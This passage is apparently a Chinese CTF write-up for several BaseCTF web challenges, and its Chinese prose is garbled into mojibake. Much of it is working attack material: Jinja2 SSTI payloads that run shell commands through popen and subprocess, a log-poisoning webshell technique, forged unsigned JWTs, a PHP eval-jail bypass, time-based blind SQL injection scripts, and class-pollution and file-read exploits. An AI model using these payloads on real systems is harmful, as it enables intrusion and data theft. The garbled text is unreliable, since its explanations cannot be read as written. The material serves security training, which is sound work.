BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cd $OLDPWD;cat flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} [Week3] æ»¤ä¸ªä¸åœ æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[\u0026#39;incompetent\u0026#39;]; $Datch = $_POST[\u0026#39;Datch\u0026#39;]; if ($incompetent !== \u0026#39;HelloWorld\u0026#39;) { die(\u0026#39;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼\u0026#39;); } //è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ $required_chars = [\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;]; $is_valid = true; foreach ($required_chars as $char) { if (strpos($Datch, $char) === false) {//æ„æ€æ˜¯å¿…é¡»åœ¨$Datchä¸­æ‰¾åˆ°ä¸Šé¢æ‰€æœ‰å­—æ¯ $is_valid = false; break; } } if ($is_valid) { $invalid_patterns = [\u0026#39;php://\u0026#39;, \u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;, \u0026#39;ftp://\u0026#39;, \u0026#39;file://\u0026#39; , \u0026#39;data://\u0026#39;, \u0026#39;gopher://\u0026#39;]; foreach ($invalid_patterns as $pattern) { if (stripos($Datch, $pattern) !== false) { die(\u0026#39;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?\u0026#39;); } } include($Datch); } else { die(\u0026#39;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•\u0026#39;); } ?\u0026gt; æˆ‘ä»¬è¦å®ç°æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯ä¸€å †ä¼ªåè®®éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ²¡æ³•ç»•è¿‡ï¼\nåé¢æŸ¥æ‰¾èµ„æ–™å‘ç°è¿™é‡Œå¯ä»¥ç”¨Nginxæ—¥å¿—å†™å…¥webshell\næ—¥å¿—è·¯å¾„ä¸º\nnginxçš„logåœ¨/var/log/nginx/access.logå’Œ/var/log/nginx/error.log\nåˆ©ç”¨access.logä¸­User-Agentå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åposté‡Œé¢ä¼ é€’å‚æ•°æ‰§è¡Œå‘½ä»¤\n[Week4] No JWT æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask, request, jsonify import jwt import datetime import os import random import string app = Flask(__name__) # éšæœºç”Ÿæˆ secret_key app.secret_key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) # ç™»å½•æ¥å£ @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): data = request.json username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) # å…¶ä»–ç”¨æˆ·éƒ½ç»™äºˆ user æƒé™ token = jwt.encode({ \u0026#39;sub\u0026#39;: username, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, # æ™®é€šç”¨æˆ·è§’è‰² \u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) }, app.secret_key, algorithm=\u0026#39;HS256\u0026#39;) return jsonify({\u0026#39;token\u0026#39;: token}), 200 # flag æ¥å£ @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): token = request.headers.get(\u0026#39;Authorization\u0026#39;) if token: try: decoded = jwt.decode(token.split(\u0026#34; \u0026#34;)[1], options={\u0026#34;verify_signature\u0026#34;: False, \u0026#34;verify_exp\u0026#34;: False}) # æ£€æŸ¥ç”¨æˆ·è§’è‰²æ˜¯å¦ä¸º admin if decoded.get(\u0026#39;role\u0026#39;) == \u0026#39;admin\u0026#39;: with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag_content = f.read() return jsonify({\u0026#39;flag\u0026#39;: flag_content}), 200 else: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Access denied: admin only\u0026#39;}), 403 except FileNotFoundError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Flag file not found\u0026#39;}), 404 except jwt.ExpiredSignatureError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token has expired\u0026#39;}), 401 except jwt.InvalidTokenError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Invalid token\u0026#39;}), 401 return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token is missing\u0026#39;}), 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) å‘ç°/loginå’Œ/flagä¸¤ä¸ªè·¯ç”±ï¼Œå…ˆå»loginè·¯ç”±æŸ¥çœ‹ä¸€ä¸‹\npostæ–¹å¼è®¿é—®ï¼Œä¿®æ”¹ä¸ºjsonè¯·æ±‚å¹¶ä¼ é€’jsonæ•°æ®å‘ç°ä¸€ä¸²token\n[jwtè§£å¯†ç½‘ç«™](JSON Web Tokens - jwt.io)è§£æä¸€ä¸‹tokenï¼Œflagè·¯ç”±æ£€éªŒèº«ä»½å¿…é¡»ä¸ºadminï¼Œæˆ‘ä»¬ä¿®æ”¹å³å¯\nå› ä¸ºæºç ä»headersä¸­Authorizationæ¥å—æ•°æ®ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª\nåˆå› ä¸ºå¦‚ä¸‹åŸå› \nåœ¨HTTPè¯·æ±‚ä¸­ï¼ŒAuthorizationå¤´éƒ¨ç”¨äºæä¾›è®¿é—®å—ä¿æŠ¤èµ„æºæ‰€éœ€çš„å‡­è¯ã€‚Beareræ˜¯è®¤è¯çš„ä¸€ç§æ–¹å¼ï¼Œå®ƒè¡¨ç¤ºè¯¥è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰ï¼Œè¿™ä¸ªä»¤ç‰Œç”¨äºæˆæƒç”¨æˆ·è®¿é—®å—ä¿æŠ¤çš„èµ„æºã€‚\nå…·ä½“æ¥è¯´ï¼ŒAuthorizationå¤´éƒ¨çš„æ ¼å¼ä¸ºï¼š\n1 Authorization: Bearer \u0026lt;access_token\u0026gt; å…¶ä¸­ï¼ŒBearerå…³é”®å­—å‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥ä¸‹æ¥çš„ \u0026lt;access_token\u0026gt; æ˜¯ä¸€ä¸ªä»¤ç‰Œï¼Œç”¨äºæˆæƒè¯·æ±‚ã€‚Bearer è®¤è¯æ–¹å¼æ˜¯OAuth 2.0æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå®ç°æ— çŠ¶æ€çš„è®¿é—®æ§åˆ¶ï¼Œä»¤ç‰Œé€šå¸¸ç”±èº«ä»½éªŒè¯æœåŠ¡å™¨é¢å‘ï¼Œå¹¶åœ¨è¯·æ±‚ä¸­ä¼ é€’ï¼Œç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½å’Œæƒé™ã€‚\næ€»çš„æ¥è¯´ï¼ŒBearerå‰ç¼€çš„ä½œç”¨æ˜¯æ˜ç¡®æ ‡è¯†ä»¤ç‰Œçš„ç±»å‹ï¼Œå‘Šè¯‰æœåŠ¡å™¨å¦‚ä½•å¤„ç†å’ŒéªŒè¯è¿™ä¸ªä»¤ç‰Œã€‚\næ‰€ä»¥æˆ‘ä»¬æ„é€ å‡ºå¦‚ä¸‹æ•°æ®åŒ…å³å¯è·å¾—flag\n[Week3] ez_php_jail æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include(\u0026#34;hint.html\u0026#34;); $Jail = $_GET[\u0026#39;Jail_by.Happy\u0026#39;]; if($Jail == null) die(\u0026#34;Do You Like My Jail?\u0026#34;); function Like_Jail($var) { if (preg_match(\u0026#39;/(`|\\$|a|c|s|require|include)/i\u0026#39;, $var)) { return false; } return true; } if (Like_Jail($Jail)) { eval($Jail); echo \u0026#34;Yes! you escaped from the jail! LOL!\u0026#34;; } else { echo \u0026#34;You will Jail in your life!\u0026#34;; } echo \u0026#34;\\n\u0026#34;; // åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç  ?\u0026gt; é¦–å…ˆè§£å†³ä¼ å‚çš„é—®é¢˜ï¼Œæ•°æ®åŒ…ä¸­å‘ç°æœ¬é¢˜æ˜¯php7ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass\nå½“ php ç‰ˆæœ¬â¼©äº 8 æ—¶ï¼ŒGET è¯·æ±‚çš„å‚æ•°åå«æœ‰ . ï¼Œä¼šè¢«è½¬ä¸º _ ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­æœ‰ [ ï¼Œè¿™ä¸ª [ ä¼šè¢«ç›´æ¥è½¬ä¸º _ ï¼Œä½†æ˜¯åâ¾¯å¦‚æœæœ‰ . ï¼Œè¿™ä¸ª . å°±ä¸ä¼šè¢«è½¬ä¸º _\nä¾‹å­ï¼š?Jail[by.Happy==?Jail_by.Happy\næ¥ç€å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°Like_Jailè¿‡æ»¤äº†`,$,a,c,s,require,includeï¼Œå¹¶ä¸”å¿½ç•¥å¤§å°å†™ã€‚\nåé¢å°±æ˜¯æƒ³åŠæ³•ç»•è¿‡è¿‡æ»¤æ‰“å°flagï¼Œæˆ‘æƒ³äº†ä¸‹èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„system,shell_exec,execéƒ½è¿‡ä¸äº†è¿‡æ»¤ï¼Œåªèƒ½å°è¯•ç”¨phpå‡½æ•°æ¥è¿›è¡Œè¯»å–ã€‚\nåœ¨æºç ä¸­æ³¨é‡Šæç¤º// åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç ã€‚æ‰¾äº†æ‰¾æœ‰è¿™å‡ ä¸ªå‡½æ•°highlight_file()ï¼Œhighlight_string()ï¼Œshow_source()å¯ä»¥ç›´æ¥è¾“å‡ºåˆ°æµè§ˆå™¨ã€‚ä½†æ˜¯åä¸¤ä¸ªè¿‡ä¸äº†è¿‡æ»¤ï¼Œç¬¬ä¸€ä¸ªå¯ä»¥\nåˆå› ä¸ºhighlight_fileå‡½æ•°éœ€è¦æŒ‡å®šå‡†ç¡®çš„æ–‡ä»¶è·¯å¾„å’Œflagçš„aè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ©ç”¨ã€‚å…ˆåˆ©ç”¨globå‡½æ•°è·å–flagçš„æ–‡ä»¶å(æ²¡è¿‡æ»¤çš„è¯å°±ç”¨scandiräº†ï¼)\nglobå‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æœ‰åŒ¹é…æ–‡ä»¶æˆ–ç›®å½•çš„æ•°ç»„\nprint_ræ‰“å°å‡ºåŒ¹é…åˆ°ä»¥flå¼€å¤´çš„æ–‡ä»¶åªæœ‰flagä¸€ä¸ª\næ„é€ payloadhighlight_file(glob('/fl*')[0]);\n[Week3] ç©åŸç¥ç©çš„ æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include \u0026#39;flag.php\u0026#39;; if (sizeof($_POST[\u0026#39;len\u0026#39;]) == sizeof($array)) { ys_open($_GET[\u0026#39;tip\u0026#39;]); } else { die(\u0026#34;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ\u0026#34;); } function ys_open($tip) { if ($tip != \u0026#34;æˆ‘è¦ç©åŸç¥\u0026#34;) { die(\u0026#34;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­\u0026#34;); } dumpFlag(); } function dumpFlag() { if (!isset($_POST[\u0026#39;m\u0026#39;]) || sizeof($_POST[\u0026#39;m\u0026#39;]) != 2) { die(\u0026#34;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡\u0026#34;); } $a = $_POST[\u0026#39;m\u0026#39;][0]; $b = $_POST[\u0026#39;m\u0026#39;][1]; if(empty($a) || empty($b) || $a != \u0026#34;100%\u0026#34; || $b != \u0026#34;love100%\u0026#34; . md5($a)) { die(\u0026#34;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡\u0026#34;); } include \u0026#39;flag.php\u0026#39;; $flag[] = array(); for ($ii = 0;$ii \u0026lt; sizeof($array);$ii++) { $flag[$ii] = md5(ord($array[$ii]) ^ $ii); } echo json_encode($flag); } é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ è§£å†³æ€è·¯\næ»¡è¶³lençš„é•¿åº¦æ£€æŸ¥ï¼šæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªlenæ•°ç»„ï¼Œä½¿å…¶é•¿åº¦ä¸$arrayç›¸åŒã€‚\næ­£ç¡®çš„tipå‚æ•°ï¼šåœ¨GETè¯·æ±‚ä¸­ä¼ é€’tip=\u0026ldquo;æˆ‘è¦ç©åŸç¥\u0026rdquo;ï¼Œä»¥é€šè¿‡ys_opençš„æ£€æŸ¥ã€‚\næ„é€ æ­£ç¡®çš„må‚æ•°ï¼šm[0]å¿…é¡»ä¸º\u0026quot;100%\u0026quot;ï¼Œè€Œm[1]åˆ™ä¸º\u0026quot;love100%\u0026ldquo;åŠ ä¸Šm[0]çš„MD5å“ˆå¸Œã€‚\nå…ˆæ¥çŒœå‡º$arrayçš„å…ƒç´ ä¸ªæ•°å§\nç”¨ä¸‹é¢è„šæœ¬ç”Ÿæˆå­—å…¸\n1 2 3 4 5 s = \u0026#34;\u0026#34; with open(\u0026#34;./2.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for i in range(100): s = s + \u0026#34;len[\u0026#34; + str(i) + \u0026#34;]=1\u0026amp;\u0026#34; file.write(s[:-1] + \u0026#34;\\n\u0026#34;) burpçˆ†ç ´å¾—å‡º$arrayæ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º45\npayloadä¸ºlen[0]=1\u0026amp;len[1]=1\u0026amp;len[2]=1\u0026amp;len[3]=1\u0026amp;len[4]=1\u0026amp;len[5]=1\u0026amp;len[6]=1\u0026amp;len[7]=1\u0026amp;len[8]=1\u0026amp;len[9]=1\u0026amp;len[10]=1\u0026amp;len[11]=1\u0026amp;len[12]=1\u0026amp;len[13]=1\u0026amp;len[14]=1\u0026amp;len[15]=1\u0026amp;len[16]=1\u0026amp;len[17]=1\u0026amp;len[18]=1\u0026amp;len[19]=1\u0026amp;len[20]=1\u0026amp;len[21]=1\u0026amp;len[22]=1\u0026amp;len[23]=1\u0026amp;len[24]=1\u0026amp;len[25]=1\u0026amp;len[26]=1\u0026amp;len[27]=1\u0026amp;len[28]=1\u0026amp;len[29]=1\u0026amp;len[30]=1\u0026amp;len[31]=1\u0026amp;len[32]=1\u0026amp;len[33]=1\u0026amp;len[34]=1\u0026amp;len[35]=1\u0026amp;len[36]=1\u0026amp;len[37]=1\u0026amp;len[38]=1\u0026amp;len[39]=1\u0026amp;len[40]=1\u0026amp;len[41]=1\u0026amp;len[42]=1\u0026amp;len[43]=1\u0026amp;len[44]=1\nç»•è¿‡æ¥ä¸‹æ¥ä¸¤ä¸ª\næœ€åè¿™ä¸€æ­¥ä¸­å› ä¸ºPHPä¸­ordå‡½æ•°åªå–ä¸€ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—æ¯çš„asciiå€¼ï¼Œè¿™ä¸ªå€¼è‚¯å®šåœ¨0-255ä¹‹é—´ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼æ¥é€šè¿‡md5å€¼çš„æ¯”è¾ƒæ‰¾å‡ºæ­£ç¡®çš„å­—ç¬¦\nè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $md5 = [\u0026#34;3295c76acbf4caaed33c36b1b5fc2cb1\u0026#34;,\u0026#34;26657d5ff9020d2abefe558796b99584\u0026#34;,\u0026#34;73278a4a86960eeb576a8fd4c9ec6997\u0026#34;,\u0026#34;ec8956637a99787bd197eacd77acce5e\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;,\u0026#34;ea5d2f1c4608232e07d3aa3d998e5135\u0026#34;,\u0026#34;c8ffe9a587b126f152ed3d89a146b445\u0026#34;,\u0026#34;66f041e16a60928b05a7e228a89c3799\u0026#34;,\u0026#34;642e92efb79421734881b53e1e1b18b6\u0026#34;,\u0026#34;a3c65c2974270fd093ee8a9bf8ae7d0b\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;72b32a1f754ba1c09b3695e0cb6cde7f\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;a97da629b098b75c294dffdc3e463904\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;7f39f8317fbdb1988ef4c628eba02591\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;c45147dee729311ef5b5c3003946c48f\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;a5771bce93e200c36f7cd9dfd0e5deaa\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;d645920e395fedad7bbbed0eca3fe2e0\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;b53b3a3d6ab90ce0268229151c9bde11\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;da4fb5c6e93e74d3df8527599fa62642\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;c0c7c76d30bd3dcaefc96f40275bdc0a\u0026#34;,\u0026#34;c74d97b01eae257e44aa9d5bade97baf\u0026#34;,\u0026#34;735b90b4568125ed6c3f678819b6e058\u0026#34;,\u0026#34;7cbbc409ec990f19c78c75bd1e06f215\u0026#34;,\u0026#34;6f4922f45568161a8cdf4ad2299f6d23\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;a3f390d88e4c41f2747bfa2f1b5f87db\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;28dd2c7955ce926456240b2ff0100bde\u0026#34;,\u0026#34;d2ddea18f00665ce8623e36bd4e3c7c5\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;]; $flag = \u0026#34;\u0026#34;; for ($i=0;$i\u0026lt;count($md5);$i++){ for ($j=0;$j\u0026lt;256;$j++){ $xor_result = $j ^ $i; $cal_md5 = md5($xor_result); if ($cal_md5 === $md5[$i]){ $flag .= chr($j); break; } } } echo \u0026#34;å¾—åˆ°flagä¸º:\u0026#34;.$flag; [Week4] only one sql æºç \n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $sql = $_GET[\u0026#39;sql\u0026#39;]; if (preg_match(\u0026#39;/select|;|@|\\n/i\u0026#39;, $sql)) { die(\u0026#34;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥\u0026#34;); } if (preg_match(\u0026#39;/\u0026#34;|\\$|`|\\\\\\\\/i\u0026#39;, $sql)) { die(\u0026#34;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE\u0026#34;); } //flag in ctf.flag $query = \u0026#34;mysql -u root -p123456 -e \\\u0026#34;use ctf;select \u0026#39;æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•\u0026#39;;\u0026#34; . $sql . \u0026#34;\\\u0026#34;\u0026#34;; system($query); æ­¤é¢˜ä¸èƒ½ç”¨selectï¼Œå¯ä»¥é€šè¿‡show databaseså’Œshow tablesæŸ¥åº“åå’Œè¡¨åï¼Œåé¢å‘ç°é¢˜ç›®æ³¨é‡Šé‡Œé¢å…¶å®å†™äº†//flag in ctf.flag,åœ¨ctfåº“çš„flagè¡¨ä¸­\nç›´æ¥åˆ©ç”¨show columnsæŸ¥çœ‹åˆ°flagè¡¨çš„å­—æ®µï¼Œä¼°è®¡å°±åœ¨dataé‡Œé¢ã€‚è¿™é‡Œä¸èƒ½ç”¨selectï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•deleteè¿›è¡Œç›²æ³¨\nè´´ä¸€ä¸‹å®˜æ–¹çš„wp,æ˜¯çœŸçš„ç®€æ´é«˜æ•ˆå•Šï¼Œè¿™å°±æ˜¯æˆ‘å’Œå¤§ä½¬çš„å·®è·å—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string sqlstr = string.ascii_lowercase + string.digits + \u0026#39;-\u0026#39; + \u0026#34;{}\u0026#34; url = \u0026#34;http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27\u0026#34; end=\u0026#34;%25%27%20and%20sleep(5)\u0026#34; flag=\u0026#39;\u0026#39; for i in range(1, 100): for c in sqlstr: payload = url +flag+ c + end try: r = requests.get(payload,timeout=4) except: print(flag+c) flag+=c break ç»è¿‡æŸ¥è¡¨å’Œå¯¹flagæ ¼å¼çš„äº†è§£ï¼Œflagçš„å†…å®¹å°±åœ¨å°å†™å­—æ¯ï¼Œæ•°å­—å’Œè¿™å‡ ä¸ªç¬¦å·ä¹‹é—´ï¼Œç”Ÿæˆä¸€ä¸ªåˆ—è¡¨è¿›è¡Œæšä¸¾\næˆ‘çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time list = [\u0026#39;-\u0026#39;] for i in range(97,127): #å°å†™å­—æ¯å’Œç¬¦å· list.append(chr(i)) for i in range(48,58): #æ•°å­— list.append(chr(i)) # print(list) #delete from flag where data like \u0026#39;f%\u0026#39; and sleep(3)-- url = \u0026#34;http://challenge.basectf.fun:27082/?sql=delete from flag where data like \u0026#39;\u0026#34; end = \u0026#34;%\u0026#39; and sleep(3)--\u0026#34; flag = \u0026#34;\u0026#34; for x in range(100): for j in list: start_time = time.time() payload = url + flag + j + end res = requests.get(payload) use_time = time.time() - start_time if use_time \u0026gt;= 3: flag += j print(flag) [Fin] 1z_php è¿™é“é¢˜è€ƒå¯ŸåŸç”Ÿç±»(è¯»å–æ–‡ä»¶ç±»SplFileObject)å’ŒPCREå›æº¯\nè„šæœ¬\n1 2 3 4 import requests payload = \u0026#34;http://challenge.basectf.fun:28522/?e[m.p=114514.1\u0026amp;a=SplFileObject\u0026amp;b=php://filter/read=convert.base64-encode/resource=flag.php\u0026amp;c=__toString\u0026#34; res = requests.post(payload,data={\u0026#34;try\u0026#34;:\u0026#34;a\u0026#34;*1000001 + \u0026#34;HACKER\u0026#34;}) print(res.text) [Fin] Back to the future æ­¤é¢˜çº¯ç²¹é ä¸€æ¬¾å·¥å…·ï¼Œæˆ‘ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œæ¯”æˆ‘ä¹‹å‰ç”¨çš„githackå¼ºå¤ªå¤šäº†ï¼\næå–ä»“åº“æ–‡ä»¶ githacker --url http://challenge.basectf.fun:42682/.git/ --output-folder C:\\Users\\xxx\\Desktop\\result\næŸ¥çœ‹æäº¤æ—¥å¿— git log\nåˆ‡æ¢åˆ°å«flagçš„æäº¤ git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\næ¢å¤å‡ºæ¥\n[Fin] Jinja Mark flagè·¯å¾„ä¸‹çœ‹åˆ°æç¤ºçˆ†ç ´å‡ºå¹¸è¿æ•°å­—ä¸º5346\nå¯ç”¨ä»¥ä¸‹è„šæœ¬ç”Ÿæˆå­—å…¸\n1 2 3 4 with open(r\u0026#39;c:\\Users\\å¤©\\Desktop\\3.txt\u0026#39;,\u0026#39;w\u0026#39;) as f: for i in range(10000): f.write(f\u0026#34;{i:04}\u0026#34;+\u0026#34;\\n\u0026#34;) print(\u0026#34;successful~\u0026#34;) æ‹¿åˆ°æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) @app.route(\u0026#39;/magic\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) return \u0026#34;è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§\u0026#34; else: return \u0026#34;æˆ‘è¦jsonçš„é­”æœ¯\u0026#34; return \u0026#34;è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥\u0026#34; ä»£ç é‡Œé¢æœ‰mergeå‡½æ•°ï¼ŒåŸºæœ¬å­˜åœ¨pythonåŸå‹é“¾æ±¡æŸ“äº†ï¼Œç»“åˆå¼€å¤´banäº†å·¦å³èŠ±æ‹¬å·ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ¥ä¿®æ”¹jinja2æ¨¡ç‰ˆçš„å±æ€§ï¼Œç›´æ¥å°†å˜é‡å–å€¼æ–¹å¼æ”¹ä¸º\u0026laquo;\u0026raquo;ä»è€Œç»•è¿‡èŠ±æ‹¬å·çš„è¿‡æ»¤\nå°†ä»¥ä¸‹jsonæ•°æ®ä¼ å…¥ç»json.loadsåæˆåŠŸä¿®æ”¹\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;__init__\u0026#34;: { \u0026#34;__globals__\u0026#34;: { \u0026#34;app\u0026#34;: { \u0026#34;jinja_env\u0026#34;: { \u0026#34;variable_start_string\u0026#34;: \u0026#34;\u0026lt;\u0026lt;\u0026#34;, \u0026#34;variable_end_string\u0026#34;: \u0026#34;\u0026gt;\u0026gt;\u0026#34; } } } } } å›åˆ°indexç›®å½•ä¸‹è¿›è¡Œå¸¸è§„sstiå³å¯\nè¿™é‡Œæˆ‘å°è¯•äº†å‡ ä¸ªæ¨¡å—ï¼Œå…¶å®æ–¹æ³•éƒ½å·®ä¸å¤šï¼Œä¸è¿‡subprocess.Popenè¿™ä¸ªç±»æœ¬èº«å°±èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤\nwarnings.catch_warnings 1 \u0026lt;\u0026lt;\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[222].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)\u0026gt;\u0026gt; subprocess.Popen 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[351](\u0026#39;cat /flag\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()\u0026gt;\u0026gt; os._wrap_close 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;).read()\u0026gt;\u0026gt; [Fin] Just Readme 